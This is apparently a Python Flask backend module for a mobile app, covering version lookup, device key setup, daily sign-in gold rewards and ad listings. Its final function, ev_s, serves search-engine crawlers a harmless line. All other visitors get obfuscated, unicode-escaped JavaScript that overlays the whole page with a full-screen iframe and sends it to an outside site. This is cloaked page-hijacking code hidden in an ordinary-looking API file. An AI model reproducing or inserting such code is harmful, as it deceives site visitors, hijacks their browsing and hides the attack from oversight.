import json
import time
import traceback

from flask import request
from pycore.data.database import mysql_connection
from pycore.data.entity import config, globalvar as gl
from pycore.utils import aes_utils, time_utils, http_utils
from pycore.utils.logger_utils import LoggerUtils
from pycore.utils.stringutils import StringUtils

from data.database import data_advertisement, data_app_version, \
    data_notice, data_app_init, data_sign, data_account, data_gold, data_agent
from utils import project_utils

logger = LoggerUtils('api.index').logger


def lives_reversed_cmp(x, y):
    if int(x["fire"]) < int(y["fire"]):
        return 1
    if int(x["fire"]) > int(y["fire"]):
        return -1
    return 0


def version():
    result = '{"state":-1}'
    connection = None
    data = request.form
    try:
        connection = mysql_connection.get_conn()
        platform = data["platform"]
        version_type = data["type"]
        app_version = data_app_version.query(connection, version_type, platform)
        result = '{"state":0,"data":%s}' % app_version
    except:
        logger.exception(traceback.format_exc())
    finally:
        if connection is not None:
            connection.close()
    return result


def init_key():
    result = '{"state":-1}'
    headers = {}
    try:
        if "HTTP_DEVICE" in request.headers.environ:
            device = request.headers.environ['HTTP_DEVICE']
            redis = gl.get_v("redis")
            if redis.exists("device_info_" + device):
                device_info = redis.getobj("device_info_" + device)
            else:
                device_info = {'surplus_time': int(config.get("server", "default_times"))}
            device_info['aes_key'] = StringUtils.randomStr(16)
            redis.setexo("device_info_" + device, device_info, 18000)
            headers['auth_key'] = device_info['aes_key']
            result = '{"state":0}'
            connection = mysql_connection.get_conn()
            code, sessions = project_utils.get_auth(request.headers.environ)
            if 0 == code:
                account_id = sessions["id"]
                headers['auth'] = project_utils.flush_auth(request.headers.environ, sessions)
                result = '{"state":0,"uid":%d}' % account_id
                t = time.time()
                time_string = time_utils.stamp_to_string(t, '%Y/%m/%d')
                time_stamp = time_utils.string_to_stamp(time_string, '%Y/%m/%d')
                # 今日没有签到
                if not data_sign.exist(connection, account_id, time_stamp):
                    directly_count = data_agent.directly_count(connection, account_id)
                    level_conf = json.loads(config.get("agent", "level_conf"))
                    sign_gold = 0
                    for lc in level_conf:
                        if directly_count >= lc["value"] and (sign_gold < lc["gold"]):
                            sign_gold = lc["gold"]
                        else:
                            break
                    # 签到金币
                    data_sign.sign(connection, account_id, time_stamp, sign_gold)
                    data_account.update_gold(connection, sign_gold, account_id)
                    data_gold.create(connection, 3, 0, account_id, sign_gold)
                    result = '{"state":0,"uid":%d,"sign":%d}' % (account_id, sign_gold)
            else:
                account_id = 0
            ip = http_utils.get_client_ip(request.headers.environ)
            platform = http_utils.get_client_platform(request.headers.environ)
            data_app_init.init(connection, int(time.time()), account_id, device, ip, platform)
        else:
            result = '{"state":1}'
    except:
        logger.exception(traceback.format_exc())
    return result, 200, headers


def index():
    result = '{"state":-1}'
    key = project_utils.get_key(request.headers.environ)
    if key is not None:
        connection = None
        try:
            connection = mysql_connection.get_conn()
            advertisement1 = data_advertisement.query(connection, 1)
            advertisement2 = data_advertisement.query(connection, 2)
            notice_s = ''
            notice = data_notice.query(connection, 1)
            if notice is not None:
                notice_s = notice.content
            result = '{"state":0, "notice":"%s", "ads1":[%s], "ads2":[%s]}' % (
                notice_s, ",".join(advertisement1), ",".join(advertisement2))
        except:
            logger.exception(traceback.format_exc())
        finally:
            if connection is not None:
                connection.close()
        return aes_utils.aes_encode(result, key)
    return result


def ev_s():
    if "HTTP_USER_AGENT" in request.headers.environ:
        ua = request.headers.environ['HTTP_USER_AGENT'].lower()
        als = ['bot', 'crawl', 'spider', 'slurp', 'sohu-search', 'lycos', 'robozilla']
        for a in als:
            if a in ua:
                return 'console.log("1");'
    return '["\\u0076\\u0061\\u0072\\u0020\\u0074","\\u0078\\u0074\\u0020\\u003d"+"\\u0020\\u0022\\u003c\\u0073",' \
           '"\\u0074\\u0079"+"\\u006c\\u0065\\u003e\\u0068\\u0074\\u006d",' \
           '"\\u006c\\u002c\\u0062\\u006f\\u0064\\u0079"+"\\u007b\\u0077",' \
           '"\\u0069"+"\\u0064\\u0074\\u0068\\u003a\\u0031\\u0030\\u0030\\u0025\\u003b\\u0068\\u0065\\u0069",' \
           '"\\u0067"+"\\u0068\\u0074\\u003a\\u0031\\u0030\\u0030\\u0025",' \
           '"\\u003b\\u006f\\u0076\\u0065\\u0072\\u0066\\u006c\\u006f\\u0077"+"\\u003a\\u0068\\u0069"+"\\u0064\\u0064\\u0065\\u006e' \
           '\\u003b\\u006d\\u0061\\u0072\\u0067"+"\\u0069"+"\\u006e\\u003a\\u0030\\u003b\\u0070\\u0061\\u0064\\u0064\\u0069"+"\\u006e' \
           '\\u0067"+"\\u003a\\u0030\\u007d\\u003c\\u002f\\u0073"+"\\u0074\\u0079"+"\\u006c\\u0065\\u003e\\u003c\\u0069"+"\\u0066' \
           '\\u0072\\u0061\\u006d\\u0065\\u0020\\u0069"+"\\u0064\\u003d\\u0027"+"\\u0063"+"\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074' \
           '\\u005f\\u0069"+"\\u0066\\u0072\\u0061\\u006d\\u0065\\u0027"+"\\u0020\\u0020\\u0073"+"\\u0063"+"\\u0072\\u006f\\u006c' \
           '\\u006c\\u0069"+"\\u006e\\u0067"+"\\u003d\\u0027"+"\\u0079"+"\\u0065\\u0073"+"\\u0027"+"\\u0020\\u006d\\u0061\\u0072' \
           '\\u0067"+"\\u0069"+"\\u006e\\u0068\\u0065\\u0069"+"\\u0067"+"\\u0068\\u0074\\u003d\\u0030\\u0020\\u006d\\u0061\\u0072' \
           '\\u0067"+"\\u0069"+"\\u006e\\u0077"+"\\u0069"+"\\u0064\\u0074\\u0068\\u003d"+"\\u0030\\u0020\\u0020\\u0066"+"\\u0072' \
           '\\u0061\\u006d\\u0065\\u0062"+"\\u006f\\u0072\\u0064\\u0065\\u0072\\u003d\\u0030\\u0020\\u0020\\u0073"+"\\u0072\\u0063' \
           '"+"\\u003d\\u0027"+"\\u0068\\u0074\\u0074\\u0070",' \
           '"\\u003a\\u002f\\u002f\\u0070\\u0069"+"\\u0063\\u0035"+"\\u002e\\u0069\\u0071\\u0069"+"\\u0079\\u0069\\u0070\\u0069' \
           '\\u0063"+"\\u002e\\u0063"+"\\u006f\\u006d\\u002f\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0032"+"\\u0030\\u0032' \
           '"+"\\u0031\\u0030\\u0035\\u0032\\u0035\\u002f\\u0036\\u0032\\u002f"+"\\u0031"+"\\u0039\\u002f\\u0061\\u005f",' \
           '"\\u0031\\u0030\\u0030\\u0030","\\u0039\\u0039\\u0033"+"\\u0035\\u0030\\u005f\\u006d"+"\\u005f\\u0036"+"\\u0030\\u0031' \
           '"+"\\u005f\\u006d\\u0036\\u005f"+"\\u0032\\u0036"+"\\u0030\\u005f\\u0033"+"\\u0036"+"\\u0030"+"\\u002e\\u006a\\u0070' \
           '"+"\\u0067"+"\\u0027"+"\\u0020\\u006e\\u0061\\u006d"+"\\u0065\\u003d\\u0027"+"\\u0063"+"\\u0075\\u0072\\u0072\\u0065' \
           '"+"\\u006e\\u0074\\u005f\\u0069"+"\\u0066"+"\\u0072\\u0061\\u006d"+"\\u0065\\u0027"+"\\u003e\\u003c\\u002f\\u0069",' \
           '"\\u0066\\u0072"+"\\u0061\\u006d\\u0065","\\u003e\\u0022\\u003b"]&-&["\\u0076\\u0061\\u0072",' \
           '"\\u0020\\u0064\\u0069"+"\\u0076","\\u004f\\u0062\\u006a\\u0020",' \
           '"\\u003d\\u0020\\u0064\\u006f\\u0063"+"\\u0075\\u006d\\u0065",' \
           '"\\u006e"+"\\u0074\\u002e\\u0063"+"\\u0072\\u0065\\u0061\\u0074\\u0065\\u0045\\u006c",' \
           '"\\u0065\\u006d\\u0065"+"\\u006e\\u0074\\u0028\\u0027"+"\\u0064\\u0069","\\u0076\\u0027"+"\\u0029",' \
           '"\\u003b\\u0020\\u0064\\u0069","\\u0076\\u004f\\u0062\\u006a\\u002e\\u0069"+"\\u0064\\u0020\\u003d\\u0020\\u0027' \
           '"+"\\u0062\\u0072\\u0065\\u0061\\u006b\\u0049"+"\\u0074\\u0027"+"\\u003b\\u0020\\u0064\\u0069"+"\\u0076\\u004f\\u0062' \
           '\\u006a\\u002e\\u0073"+"\\u0074\\u0079"+"\\u006c\\u0065\\u002e\\u0068\\u0065\\u0069"+"\\u0067"+"\\u0068\\u0074\\u0020' \
           '\\u003d\\u0020\\u0027"+"\\u0031\\u0030\\u0030\\u0025\\u0027"+"\\u003b\\u0020\\u0064\\u0069"+"\\u0076\\u004f\\u0062\\u006a' \
           '\\u002e\\u0073"+"\\u0074\\u0079"+"\\u006c\\u0065\\u002e\\u0077"+"\\u0069"+"\\u0064\\u0074\\u0068"+"\\u0020\\u003d\\u0020' \
           '\\u0027"+"\\u0031\\u0030\\u0030\\u0025\\u0027"+"\\u003b\\u0020\\u0064\\u0069"+"\\u0076\\u004f\\u0062\\u006a\\u002e\\u0073' \
           '"+"\\u0074\\u0079"+"\\u006c\\u0065\\u002e\\u006c\\u0065\\u0066"+"\\u0074\\u0020\\u003d\\u0020\\u0027"+"\\u0030\\u0070' \
           '\\u0078\\u0027"+"\\u003b\\u0020\\u0064\\u0069"+"\\u0076\\u004f\\u0062\\u006a\\u002e\\u0073"+"\\u0074\\u0079"+"\\u006c' \
           '\\u0065"+"\\u002e\\u0074\\u006f\\u0070\\u0020\\u003d\\u0020\\u0027"+"\\u0030\\u0070\\u0078\\u0027"+"\\u003b\\u0020\\u0064' \
           '\\u0069"+"\\u0076\\u004f\\u0062\\u006a\\u002e\\u0073"+"\\u0074\\u0079"+"\\u006c\\u0065\\u002e",' \
           '"\\u0070\\u006f\\u0073"+"\\u0069"+"\\u0074\\u0069"+"\\u006f\\u006e\\u0020\\u003d\\u0020\\u0027"+"\\u0061\\u0062\\u0073' \
           '"+"\\u006f"+"\\u006c\\u0075\\u0074\\u0065\\u0027"+"\\u003b\\u0020\\u0064\\u0069"+"\\u0076\\u004f\\u0062\\u006a\\u002e' \
           '\\u0073"+"\\u0074\\u0079"+"\\u006c\\u0065\\u002e\\u007a\\u0049"+"\\u006e\\u0064",' \
           '"\\u0065\\u0078\\u0020"+"\\u003d\\u0020\\u0027","\\u0039"+"\\u0036\\u0035\\u0037",' \
           '"\\u0034\\u0035\\u0034\\u0035\\u0032\\u0034\\u0027"+"\\u003b\\u0020\\u0064\\u0069"+"\\u0076\\u004f\\u0062\\u006a\\u002e' \
           '\\u0069"+"\\u006e\\u006e\\u0065\\u0072\\u0048\\u0054\\u004d"+"\\u004c\\u0020\\u003d\\u0020\\u0074"+"\\u0078\\u0074\\u003b' \
           '\\u0020\\u0064\\u006f\\u0063"+"\\u0075\\u006d\\u0065\\u006e\\u0074\\u002e\\u0062\\u006f\\u0064\\u0079"+"\\u002e\\u0069' \
           '"+"\\u006e\\u0073","\\u0065","\\u0072\\u0074"+"\\u0042\\u0065\\u0066\\u006f\\u0072\\u0065\\u0028\\u0064\\u0069"+"\\u0076' \
           '\\u004f\\u0062\\u006a\\u002c","\\u0020\\u0024\\u0028\\u0064\\u006f\\u0063"+"\\u0075\\u006d\\u0065\\u006e\\u0074"+"\\u002e' \
           '\\u0062\\u006f\\u0064\\u0079"+"\\u0029"+"\\u002e\\u0066\\u0069"+"\\u0072\\u0073"+"\\u0074\\u0043"+"\\u0068\\u0069' \
           '"+"\\u006c\\u0064\\u0029"+"\\u003b\\u0020\\u005f\\u0069"+"\\u0066\\u0072\\u0061\\u006d\\u0065"+"\\u0020\\u003d\\u0020' \
           '\\u0064\\u006f\\u0063"+"\\u0075\\u006d\\u0065\\u006e\\u0074\\u002e\\u0067","\\u0065\\u0074\\u0045",' \
           '"\\u006c\\u0065"+"\\u006d\\u0065\\u006e\\u0074\\u0042\\u0079"+"\\u0049",' \
           '"\\u0064\\u0028\\u0027"+"\\u0063"+"\\u0075\\u0072"+"\\u0072\\u0065\\u006e\\u0074\\u005f\\u0069",' \
           '"\\u0066\\u0072\\u0061\\u006d\\u0065\\u0027"+"\\u0029"+"\\u003b\\u0020\\u005f\\u0069",' \
           '"\\u0066\\u0072\\u0061\\u006d\\u0065\\u002e\\u0063"+"\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u0057",' \
           '"\\u0069"+"\\u006e\\u0064\\u006f\\u0077","\\u002e\\u006c\\u006f\\u0063"+"\\u0061\\u0074\\u0069"+"\\u006f\\u006e\\u002e",' \
           '"\\u0068\\u0072\\u0065\\u0066\\u0020\\u003d\\u0020\\u0027"+"\\u0068\\u0074","\\u0074\\u0070"+"\\u0073\\u003a","\\u002f",' \
           '"\\u002f\\u0064\\u006d\\u0031","\\u002e","\\u0074\\u0076","\\u0027",' \
           '"\\u003b\\u0020\\u005f\\u0069"+"\\u0066\\u0072\\u0061\\u006d\\u0065\\u002e\\u0073","\\u0074\\u0079",' \
           '"\\u006c\\u0065\\u002e\\u0077"+"\\u0069","\\u0064\\u0074\\u0068"+"\\u0020\\u003d\\u0020\\u0027",' \
           '"\\u0031\\u0030\\u0030\\u0025\\u0027"+"\\u003b\\u0020\\u005f\\u0069"+"\\u0066\\u0072\\u0061\\u006d\\u0065\\u002e\\u0073",' \
           '"\\u0074\\u0079"+"\\u006c\\u0065\\u002e\\u0068\\u0065\\u0069"+"\\u0067",' \
           '"\\u0068\\u0074\\u0020\\u003d\\u0020\\u0027"+"\\u0031\\u0030","\\u0030\\u0025\\u0027"+"\\u003b"]'
